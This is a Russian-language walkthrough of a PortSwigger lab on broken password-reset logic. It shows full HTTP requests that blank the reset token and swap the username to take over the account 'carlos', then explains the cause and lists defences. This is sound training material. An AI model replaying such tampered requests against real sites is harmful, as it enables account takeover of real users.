# 📘 PortSwigger Lab: Password Reset Broken Logic

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic  
> 🎯 Тема: Authentication vulnerabilities — Password Reset Broken Logic  
> 🧪 Уровень: Apprentice  
> ✅ Статус: Solved  

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [🔍 Шаг 1 — Запрашиваем сброс пароля](#step1)
- [🔍 Шаг 2 — Получаем reset-ссылку](#step2)
- [🔍 Шаг 3 — Анализируем POST-запрос](#step3)
- [🔍 Шаг 4 — Проверяем пустой token](#step4)
- [🔍 Шаг 5 — Меняем username на carlos](#step5)
- [🔍 Шаг 6 — Входим в аккаунт Carlos](#step6)
- [🧩 Использованные данные](#payloads)
- [🔬 Почему атака сработала](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)

---

<a id="goal"></a>

## 🎯 Цель

Использовать ошибку в логике восстановления пароля, установить новый пароль для пользователя `carlos` и войти в его аккаунт.

Тестовая учётная запись:

```text
wiener:peter
```

Целевой пользователь:

```text
carlos
```

---

<a id="theory"></a>

## 🧠 Краткая теория

Password Reset — это альтернативный механизм аутентификации.

Обычный вход:

```text
username + password
```

Восстановление пароля:

```text
доступ к email + валидный reset token
```

Безопасная схема должна выглядеть так:

```text
reset token
    ↓
сервер находит связанный user_id
    ↓
меняет пароль только этому пользователю
```

Опасная схема:

```text
username приходит из браузера
    ↓
сервер доверяет username
    ↓
атакующий меняет цель запроса
```

Главное правило:

```text
Пользователь должен определяться по token на сервере,
а не по username из POST-запроса.
```

Hidden-поле тоже нельзя считать доверенным:

```html
<input type="hidden" name="username" value="wiener">
```

Через Burp его легко изменить на:

```text
username=carlos
```

---

<a id="idea"></a>

## 🧩 Ключевая идея

Логика атаки:

```text
1. Получить reset-ссылку для wiener.
2. Перехватить запрос смены пароля.
3. Очистить reset token.
4. Проверить, принимает ли сервер пустой token.
5. Заменить username=wiener на username=carlos.
6. Установить Carlos новый пароль.
7. Войти в его аккаунт.
```

Уязвимость:

```text
empty token
+
client-controlled username
=
account takeover
```

---

<a id="step1"></a>

## 🔍 Шаг 1 — Запрашиваем сброс пароля

Открываем страницу:

```text
Forgot password
```

Вводим:

```text
wiener
```

Отправляем запрос восстановления.

Приложение отправляет письмо на email тестового пользователя.

---

<a id="step2"></a>

## 🔍 Шаг 2 — Получаем reset-ссылку

В exploit server открываем почтовый клиент.

Полученная ссылка:

```text
/forgot-password?temp-forgot-password-token=v37mhkrzvlu526khx8woijeuvb1xktiy
```

Переходим по ссылке и вводим новый пароль, например:

```text
test123
```

После отправки формы находим запрос в:

```text
Burp Proxy → HTTP history
```

и отправляем его в Repeater:

```text
Right click → Send to Repeater
```

---

<a id="step3"></a>

## 🔍 Шаг 3 — Анализируем POST-запрос

Исходный запрос:

```http
POST /forgot-password?temp-forgot-password-token=v37mhkrzvlu526khx8woijeuvb1xktiy HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=v37mhkrzvlu526khx8woijeuvb1xktiy&
username=wiener&
new-password-1=test123&
new-password-2=test123
```

Важные параметры:

```text
temp-forgot-password-token
username
new-password-1
new-password-2
```

Подозрительный параметр:

```text
username=wiener
```

Сервер не должен спрашивать браузер, какому пользователю принадлежит token. Он должен определить это самостоятельно.

Также token передаётся дважды:

```text
1. В URL.
2. В body.
```

Это стоит проверить отдельно.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Проверяем пустой token

В Repeater очищаем token в URL:

```http
POST /forgot-password?temp-forgot-password-token= HTTP/2
```

И в body:

```text
temp-forgot-password-token=&
username=wiener&
new-password-1=test123&
new-password-2=test123
```

Отправляем запрос.

Ответ:

```http
HTTP/2 302 Found
Location: /
```

Приложение не вернуло:

```text
Invalid token
Expired token
Unauthorized
```

Значит, финальный POST принимает пустой token.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Меняем username на carlos

Теперь меняем:

```text
username=wiener
```

на:

```text
username=carlos
```

Выбираем новый пароль:

```text
NewPass123!
```

Финальный body:

```text
temp-forgot-password-token=&username=carlos&new-password-1=NewPass123%21&new-password-2=NewPass123%21
```

Полный запрос:

```http
POST /forgot-password?temp-forgot-password-token= HTTP/2
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&username=carlos&new-password-1=NewPass123%21&new-password-2=NewPass123%21
```

Успешный ответ:

```http
HTTP/2 302 Found
Location: /
```

---

<a id="step6"></a>

## 🔍 Шаг 6 — Входим в аккаунт Carlos

Открываем страницу входа и используем:

<details>
<summary>🔑 Показать итоговые данные</summary>

```text
Username: carlos
Password: NewPass123!
```

</details>

После входа открываем:

```text
My account
```

Лаборатория решена.

---

<a id="payloads"></a>

## 🧩 Использованные данные

Reset token:

```text
v37mhkrzvlu526khx8woijeuvb1xktiy
```

Исходный пользователь:

```text
wiener
```

Целевой пользователь:

```text
carlos
```

Финальный payload:

```text
temp-forgot-password-token=&username=carlos&new-password-1=NewPass123%21&new-password-2=NewPass123%21
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

В приложении было две ошибки.

### 1. Token не проверялся при POST

Пустое значение:

```text
temp-forgot-password-token=
```

не остановило смену пароля.

### 2. Username контролировался клиентом

Сервер использовал:

```text
username=carlos
```

для выбора аккаунта.

Правильная логика:

```text
token → user_id → смена пароля
```

Уязвимая логика:

```text
username из POST → смена пароля
```

Результат:

```text
произвольный сброс пароля
→ полный захват аккаунта
```

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Правильная логика:

```text
1. Изучить весь reset workflow.
2. Найти финальный state-changing request.
3. Проверить, какие параметры контролирует клиент.
4. Удалить или очистить token.
5. Изменить username на другой тестовый аккаунт.
6. Проверить реальный результат входом.
```

Особенно внимательно проверяй параметры:

```text
username
email
user_id
account_id
token
code
state
```

Главный вывод:

```text
Проверка token при открытии формы
не означает, что token проверяется при смене пароля.
```

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### 1. Проверять только GET-запрос

Критическая операция выполняется в POST.

### 2. Считать hidden-поле безопасным

Hidden влияет только на отображение.

### 3. Не очищать token в двух местах

В этой лаборатории token находится и в URL, и в body.

### 4. Смотреть только на статус 302

Нужно подтвердить результат входом в аккаунт.

### 5. Сразу менять username без проверки token

Лучше сначала доказать, что пустой token действительно принимается.

### 6. Использовать чужой реальный аккаунт

В реальном пентесте используем только разрешённые тестовые аккаунты.

---

<a id="defense"></a>

## 🛡 Защита

Правильная реализация:

```text
1. Генерировать случайный одноразовый token.
2. Хранить связь token → user_id на сервере.
3. Проверять token при GET и при POST.
4. Не принимать username как источник авторизации.
5. Ограничивать срок действия token.
6. Делать token недействительным после использования.
7. Использовать HTTPS.
8. Логировать подозрительные reset attempts.
```

Безопасный POST:

```text
token=<value>
new_password=<value>
confirm_password=<value>
```

Сервер сам получает пользователя:

```text
user_id = reset_record.user_id
```

---

<a id="checklist"></a>

## ✅ Чек-лист

- [x] Запрошен reset для `wiener`.
- [x] Получена reset-ссылка.
- [x] Найден POST-запрос смены пароля.
- [x] Запрос отправлен в Repeater.
- [x] Token очищен в URL.
- [x] Token очищен в body.
- [x] Подтверждён ответ `302 Found`.
- [x] `username=wiener` заменён на `username=carlos`.
- [x] Carlos установлен новый пароль.
- [x] Выполнен вход в аккаунт.
- [x] Открыта страница My account.
- [x] Лаборатория решена.

---

# ✅ Lab Solved
